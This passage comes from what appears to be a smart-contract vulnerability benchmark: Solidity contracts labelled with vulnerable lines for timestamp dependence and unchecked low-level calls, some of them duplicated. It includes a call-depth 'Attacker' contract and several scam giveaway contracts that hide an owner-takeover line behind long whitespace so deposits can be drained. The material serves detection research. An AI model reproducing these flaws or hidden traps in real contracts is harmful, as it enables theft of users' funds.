    jackpot += msg.value/2;
    // <yes> <report> TIME_MANIPULATION
    lastInvestmentTimestamp = block.timestamp;
  }
  function resetInvestment() {
    if (block.timestamp < lastInvestmentTimestamp+ONE_MINUTE)
      throw;
    lastInvestor.send(jackpot);
    owner.send(this.balance-1 ether);
    lastInvestor = 0;
    jackpot = 1 ether;
    lastInvestmentTimestamp = 0;
  }
}
contract Attacker {
  function attack(address target, uint count) {
    if (0<=count && count<1023) {
      this.attack.gas(msg.gas-2000)(target, count+1);
    }
    else {
      Governmental(target).resetInvestment();
    }
  }
}",[23]
"/*
 * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/timestampdependent.sol
 * @author: -
 * @vulnerable_at_lines: 13,27
 */
pragma solidity ^0.4.0;
contract lottopollo {
  address leader;
  uint    timestamp;
  function payOut(uint rand) internal {
    // <yes> <report> TIME MANIPULATION
    if ( rand> 0 && now - rand > 24 hours ) {
      msg.sender.send( msg.value );
      if ( this.balance > 0 ) {
        leader.send( this.balance );
      }
    }
    else if ( msg.value >= 1 ether ) {
      leader = msg.sender;
      timestamp = rand;
    }
  }
  function randomGen() constant returns (uint randomNumber) {
      // <yes> <report> TIME MANIPULATION
      return block.timestamp;   
    }
  function draw(uint seed){
    uint randomNumber=randomGen(); 
    payOut(randomNumber);
  }
}","[12, 25]"
"/*
 * @source: https://github.com/sigp/solidity-security-blog
 * @author: -
 * @vulnerable_at_lines: 18,20
 */
pragma solidity ^0.4.25;
contract Roulette {
    uint public pastBlockTime; // Forces one bet per block
    constructor() public payable {} // initially fund contract
    // fallback function used to make a bet
    function () public payable {
        require(msg.value == 10 ether); // must send 10 ether to play
        // <yes> <report> TIME_MANIPULATION
        require(now != pastBlockTime); // only 1 transaction per block
        // <yes> <report> TIME_MANIPULATION
        pastBlockTime = now;
        if(now % 15 == 0) { // winner
            msg.sender.transfer(this.balance);
        }
    }
}","[14, 16]"
"/*
 * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/timestamp_dependence/timed_crowdsale.sol
 * @author: -
 * @vulnerable_at_lines: 13
 */
pragma solidity ^0.4.25;
contract TimedCrowdsale {
  // Sale should finish exactly at January 1, 2019
  function isSaleFinished() view public returns (bool) {
    // <yes> <report> TIME_MANIPULATION
    return block.timestamp >= 1546300800;
  }
}",[11]
"    }
    /**
     * method to determine winners and losers
     */
    function play()
    isOpenToPublic()
    onlyRealPeople()
    onlyPlayers()
    public
    {
        uint256 blockNumber = timestamps[msg.sender];
        if(blockNumber < block.number)
        {
            timestamps[msg.sender] = 0;
            wagers[msg.sender] = 0;
            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;
            if(winningNumber == difficulty / 2)
            {
                payout(msg.sender);
            }
            else
            {
                //player loses
                loseWager(betLimit / 2);
            }
        }
        else
        {
            revert();
        }
    }
    /**
     * For those that just want to donate to the whale
     */
    function donate()
    isOpenToPublic()
    public
    payable
    {
        donateToWhale(msg.value);
    }
    /**
     * Payout ETH to winner
     */
    function payout(address winner)
    internal
    {
        uint256 ethToTransfer = address(this).balance / 2;
        winner.transfer(ethToTransfer);
        emit Win(ethToTransfer, winner);
    }
    /**
     * Payout ETH to whale
     */
    function donateToWhale(uint256 amount)
    internal
    {
        // <yes> <report> UNCHECKED_LL_CALLS
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));
        totalDonated += amount;
        emit Donate(amount, whale, msg.sender);
    }
    /**
     * Payout ETH to whale when player loses
     */
    function loseWager(uint256 amount)
    internal
    {
        // <yes> <report> UNCHECKED_LL_CALLS
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));
        totalDonated += amount;
        emit Lose(amount, msg.sender);
    }
    /**
     * ETH balance of contract
     */
    function ethBalance()
    public
    view
    returns (uint256)
    {
        return address(this).balance;
    }
    /**
     * current difficulty of the game
     */
    function currentDifficulty()
    public
    view
    returns (uint256)
    {
        return difficulty;
    }
    /**
     * current bet amount for the game
     */
    function currentBetLimit()
    public
    view
    returns (uint256)
    {
        return betLimit;
    }
    function hasPlayerWagered(address player)
    public
    view
    returns (bool)
    {
        if(wagers[player] > 0)
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    /**
     * For the UI to properly display the winner's pot
     */
    function winnersPot()
    public
    view
    returns (uint256)
    {
        return address(this).balance / 2;
    }
    /**","[59, 70]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 12
 */
pragma solidity ^0.4.10;
contract Caller {
    function callAddress(address a) {
        // <yes> <report> UNCHECKED_LL_CALLS
        a.call();
    }
}",[10]
"		t.amount = amount;
		t.recipient = receiver;
		t.coinContract.transfer(receiver, amount);
		numTransfers++;
	}
     // Crowdfunding:
uint public tokenCreationRate=1000;
uint public bonusCreationRate=1000;
uint public CreationRate=1761;
   uint256 public constant oneweek = 36000;
uint256 public fundingEndBlock = 5433616;
bool public funding = true;
bool public refundstate = false;
bool public migratestate= false;
        function createDaoPOLSKAtokens(address holder) payable {
        if (!funding) throw;
        // Do not allow creating 0 or more than the cap tokens.
        if (msg.value == 0) throw;
		// check the maximum token creation cap
        if (msg.value > (supplylimit - totalSupply) / CreationRate)
          throw;
		//bonus structure
// in early stage there is about 100% more details in ico regulations on website
// price and converstion rate in tabled to PLN not ether, and is updated daily
	 var numTokensRAW = msg.value;
        var numTokens = msg.value * CreationRate;
        totalSupply += numTokens;
        // Assign new tokens to the sender
        balances[holder] += numTokens;
        balancesRAW[holder] += numTokensRAW;
        // Log token creation event
        Transfer(0, holder, numTokens);
		// Create additional Dao Tokens for the community and developers around 12%
        uint256 percentOfTotal = 12;
        uint256 additionalTokens = 	numTokens * percentOfTotal / (100);
        totalSupply += additionalTokens;
        balances[migrationMaster] += additionalTokens;
        Transfer(0, migrationMaster, additionalTokens);
	}
	function setBonusCreationRate(uint newRate){
	if(msg.sender == owner) {
	bonusCreationRate=newRate;
	CreationRate=tokenCreationRate+bonusCreationRate;
	}
	}
    function FundsTransfer() external {
	if(funding==true) throw;
		 	if (!owner.send(this.balance)) throw;
    }
    function PartialFundsTransfer(uint SubX) external {
	      if (msg.sender != owner) throw;
        // <yes> <report> UNCHECKED_LL_CALLS
        owner.send(this.balance - SubX);
	}
	function turnrefund() external {
	      if (msg.sender != owner) throw;
	refundstate=!refundstate;
        }
			function fundingState() external {
	      if (msg.sender != owner) throw;
	funding=!funding;
        }
    function turnmigrate() external {
	      if (msg.sender != migrationMaster) throw;
	migratestate=!migratestate;
}
    // notice Finalize crowdfunding clossing funding options
function finalize() external {
        if (block.number <= fundingEndBlock+8*oneweek) throw;
        // Switch to Operational state. This is the only place this can happen.
        funding = false;
		refundstate=!refundstate;
        // Transfer ETH to theDAO Polska Token network Storage address.
        if (msg.sender==owner)
        // <yes> <report> UNCHECKED_LL_CALLS
		owner.send(this.balance);
    }
    function migrate(uint256 _value) external {
        // Abort if not in Operational Migration state.
        if (migratestate) throw;
        // Validate input value.
        if (_value == 0) throw;
        if (_value > balances[msg.sender]) throw;
        balances[msg.sender] -= _value;
        totalSupply -= _value;
        totalMigrated += _value;
        MigrationAgent(migrationAgent).migrateFrom(msg.sender, _value);
        Migrate(msg.sender, migrationAgent, _value);
    }
function refundTRA() external {
        // Abort if not in Funding Failure state.
        if (funding) throw;
        if (!refundstate) throw;
        var DAOPLTokenValue = balances[msg.sender];
        var ETHValue = balancesRAW[msg.sender];
        if (ETHValue == 0) throw;
        balancesRAW[msg.sender] = 0;
        totalSupply -= DAOPLTokenValue;
        Refund(msg.sender, ETHValue);
        msg.sender.transfer(ETHValue);
}
function preICOregulations() external returns(string wow) {
	return 'Regulations of preICO are present at website  daopolska.pl and by using this smartcontract you commit that you accept and will follow those rules';
}
}
//------------------------------------------------------","[53, 76]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 14
 */
pragma solidity ^0.4.25; 
contract demo{
    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
             // <yes> <report> UNCHECKED_LL_CALLS
            caddress.call(id,from,_tos[i],v[i]);
        }
        return true;
    }
}",[13]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44,97
 */
pragma solidity ^0.4.18;
contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    modifier onlyOwner
    {
        if(owner == msg.sender)_;
    }
}
contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
        // <yes> <report> UNCHECKED_LL_CALLS
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 
    }
}
contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
     ///Constructor
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }
    function()
    payable
    {
        Deposit();
    }
    function Deposit() 
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to]>0)
        {
            Holders[_to]=0;
            WithdrawToken(_token,_amount,_to);     
        }
    }
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_addr]>=_wei)
            {
                // <yes> <report> UNCHECKED_LL_CALLS
                _addr.call.value(_wei);
                Holders[_addr]-=_wei;
            }
        }
    }
}","[38, 85]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44,97
 */
pragma solidity ^0.4.18;
contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    modifier onlyOwner
    {
        if(owner == msg.sender)_;
    }
}
contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
        // <yes> <report> UNCHECKED_LL_CALLS
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 
    }
}
contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
     ///Constructor
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }
    function()
    payable
    {
        Deposit();
    }
    function Deposit() 
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to]>0)
        {
            Holders[_to]=0;
            WithdrawToken(_token,_amount,_to);     
        }
    }
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_addr]>=_wei)
            {
                // <yes> <report> UNCHECKED_LL_CALLS
                _addr.call.value(_wei);
                Holders[_addr]-=_wei;
            }
        }
    }
    function Bal() public constant returns(uint){return this.balance;}
}","[38, 85]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */
 pragma solidity ^0.4.18;
contract MultiplicatorX4
{
    address public Owner = msg.sender;
    function() public payable{}
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}",[24]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 45
 */
pragma solidity ^0.4.19;
contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
    function()
    public
    payable
    {
    }
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[38]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 16
 */
pragma solidity ^0.4.24;
contract airdrop{
    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
             // <yes> <report> UNCHECKED_LL_CALLS
            caddress.call(id,from,_tos[i],v);
        }
        return true;
    }
}",[13]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 19 
 */
pragma solidity ^0.4.18;
contract EBU{
    address public from = 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9;
    address public caddress = 0x1f844685f7Bf86eFcc0e74D8642c54A257111923;
    function transfer(address[] _tos,uint[] v)public returns (bool){
        require(msg.sender == 0x9797055B68C5DadDE6b3c7d5D80C9CFE2eecE6c9);
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            // <yes> <report> UNCHECKED_LL_CALLS
            caddress.call(id,from,_tos[i],v[i]*1000000000000000000);
        }
        return true;
    }
}",[16]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 17
 */
pragma solidity ^0.4.24;
contract airPort{
    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){
        require(_tos.length > 0);
        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));
        for(uint i=0;i<_tos.length;i++){
            // <yes> <report> UNCHECKED_LL_CALLS
            caddress.call(id,from,_tos[i],v);
        }
        return true;
    }
}",[13]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 21
 */
pragma solidity ^0.4.13;
contract Centra4 {
	function transfer() returns (bool) {	
		address contract_address;
		contract_address = 0x96a65609a7b84e8842732deb08f56c3e21ac6f8a;
		address c1;		
		address c2;
		uint256 k;
		k = 1;
		c2 = 0xaa27f8c1160886aacba64b2319d8d5469ef2af79;	
		// <yes> <report> UNCHECKED_LL_CALLS	
		contract_address.call(""register"", ""CentraToken"");
		if(!contract_address.call(bytes4(keccak256(""transfer(address,uint256)"")),c2,k)) return false;
		return true;
	}
}",[17]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 27
 */
pragma solidity ^0.4.19;
contract Token {
    function transfer(address _to, uint _value) returns (bool success);
    function balanceOf(address _owner) constant returns (uint balance);
}
contract EtherGet {
    address owner;
    function EtherGet() {
        owner = msg.sender;
    }
    function withdrawTokens(address tokenContract) public {
        Token tc = Token(tokenContract);
        tc.transfer(owner, tc.balanceOf(this));
    }
    function withdrawEther() public {
        owner.transfer(this.balance);
    }
    function getTokens(uint num, address addr) public {
        for(uint i = 0; i < num; i++){
            // <yes> <report> UNCHECKED_LL_CALLS
            addr.call.value(0 wei)();
        }
    }
}",[26]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */
pragma solidity ^0.4.18;
contract MultiplicatorX3
{
    address public Owner = msg.sender;
    function() public payable{}
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}",[24]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 33
 */
pragma solidity ^0.4.24;
contract SimpleWallet {
    address public owner = msg.sender;
    uint public depositsCount;
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    function() public payable {
        depositsCount++;
    }
    function withdrawAll() public onlyOwner {
        withdraw(address(this).balance);
    }
    function withdraw(uint _value) public onlyOwner {
        msg.sender.transfer(_value);
    }
    function sendMoney(address _target, uint _value, bytes _data) public onlyOwner {
        // <yes> <report> UNCHECKED_LL_CALLS
        _target.call.value(_value)(_data);
    }
}",[25]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44
 */
pragma solidity ^0.4.19;
contract Ownable
{
    address newOwner;
    address owner = msg.sender;
    function changeOwner(address addr)
    public
    onlyOwner
    {
        newOwner = addr;
    }
    function confirmOwner() 
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    modifier onlyOwner
    {
        if(owner == msg.sender)_;
    }
}
contract Token is Ownable
{
    address owner = msg.sender;
    function WithdrawToken(address token, uint256 amount,address to)
    public 
    onlyOwner
    {
         // <yes> <report> UNCHECKED_LL_CALLS
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 
    }
}
contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;
     ///Constructor
    function initTokenBank()
    public
    {
        owner = msg.sender;
        MinDeposit = 1 ether;
    }
    function()
    payable
    {
        Deposit();
    }
    function Deposit() 
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }
    function WitdrawTokenToHolder(address _to,address _token,uint _amount)
    public
    onlyOwner
    {
        if(Holders[_to]>0)
        {
            Holders[_to]=0;
            WithdrawToken(_token,_amount,_to);     
        }
    }
    function WithdrawToHolder(address _addr, uint _wei) 
    public
    onlyOwner
    payable
    {
        if(Holders[_addr]>0)
        {
            if(_addr.call.value(_wei)())
            {
                Holders[_addr]-=_wei;
            }
        }
    }
}",[38]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 29
 */
pragma solidity ^0.4.19;
contract HomeyJar {
    address public Owner = msg.sender;
    function() public payable {}
    function GetHoneyFromJar() public payable {                                              
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data) payable public {
        require(msg.sender == Owner);
         // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[23]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 45
 */
pragma solidity ^0.4.19;
contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
    function()
    public
    payable
    {
    }
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=minEligibility)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[38]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44
 */
pragma solidity ^0.4.19;
contract WhaleGiveaway1
{
    address public Owner = msg.sender;
    function()
    public
    payable
    {
    }
    function GetFreebie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[37]
"    }
    /**
     * method to determine winners and losers
     */
    function play()
    isOpenToPublic()
    onlyRealPeople()
    onlyPlayers()
    public
    {
        uint256 blockNumber = timestamps[msg.sender];
        if(blockNumber < block.number)
        {
            timestamps[msg.sender] = 0;
            wagers[msg.sender] = 0;
            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;
            if(winningNumber == difficulty / 2)
            {
                payout(msg.sender);
            }
            else
            {
                //player loses
                loseWager(betLimit / 2);
            }
        }
        else
        {
            revert();
        }
    }
    /**
     * For those that just want to donate to the whale
     */
    function donate()
    isOpenToPublic()
    public
    payable
    {
        donateToWhale(msg.value);
    }
    /**
     * Payout ETH to winner
     */
    function payout(address winner)
    internal
    {
        uint256 ethToTransfer = address(this).balance / 2;
        winner.transfer(ethToTransfer);
        emit Win(ethToTransfer, winner);
    }
    /**
     * Payout ETH to whale
     */
    function donateToWhale(uint256 amount)
    internal
    {
        // <yes> <report> UNCHECKED_LL_CALLS
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));
        totalDonated += amount;
        emit Donate(amount, whale, msg.sender);
    }
    /**
     * Payout ETH to whale when player loses
     */
    function loseWager(uint256 amount)
    internal
    {
        // <yes> <report> UNCHECKED_LL_CALLS
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));
        totalDonated += amount;
        emit Lose(amount, msg.sender);
    }
    /**
     * ETH balance of contract
     */
    function ethBalance()
    public
    view
    returns (uint256)
    {
        return address(this).balance;
    }
    /**
     * current difficulty of the game
     */
    function currentDifficulty()
    public
    view
    returns (uint256)
    {
        return difficulty;
    }
    /**
     * current bet amount for the game
     */
    function currentBetLimit()
    public
    view
    returns (uint256)
    {
        return betLimit;
    }
    function hasPlayerWagered(address player)
    public
    view
    returns (bool)
    {
        if(wagers[player] > 0)
        {
            return true;
        }
        else
        {
            return false;
        }
    }
    /**
     * For the UI to properly display the winner's pot
     */
    function winnersPot()
    public
    view
    returns (uint256)
    {
        return address(this).balance / 2;
    }
    /**","[59, 70]"
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 44
 */
pragma solidity ^0.4.19;
contract Pie
{
    address public Owner = msg.sender;
    function()
    public
    payable
    {
    }
    function GetPie()
    public
    payable
    {                                                                    
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
            msg.sender.transfer(this.balance);
        }                                                                                                                
    }
    function withdraw()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        // <yes> <report> UNCHECKED_LL_CALLS
        adr.call.value(msg.value)(data);
    }
}",[37]
"/*
 * @source: etherscan.io 
 * @author: -
 * @vulnerable_at_lines: 56
 */
pragma solidity ^0.4.16;
/// @author Bowen Sanders
/// sections built on the work of Jordi Baylina (Owned, data structure)
/// smartwedindex.sol contains a simple index of contract address, couple name, actual marriage date, bool displayValues to
/// be used to create an array of all SmartWed contracts that are deployed 
/// contract 0wned is licesned under GNU-3
/// @dev `Owned` is a base level contract that assigns an `owner` that can be
///  later changed
contract Owned {
    /// @dev `owner` is the only address that can call a function with this
    /// modifier
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    address public owner;
    /// @notice The Constructor assigns the message sender to be `owner`
    function Owned() {
        owner = msg.sender;
    }
    address public newOwner;
    /// @notice `owner` can step down and assign some other address to this role
    /// @param _newOwner The address of the new owner
    ///  an unowned neutral vault, however that cannot be undone
    function changeOwner(address _newOwner) onlyOwner {
        newOwner = _newOwner;
    }
    /// @notice `newOwner` has to accept the ownership before it is transferred
    ///  Any account or any contract with the ability to call `acceptOwnership`
    ///  can be used to accept ownership of this contract, including a contract
    ///  with no other functions
    function acceptOwnership() {
        if (msg.sender == newOwner) {
            owner = newOwner;
        }
    }
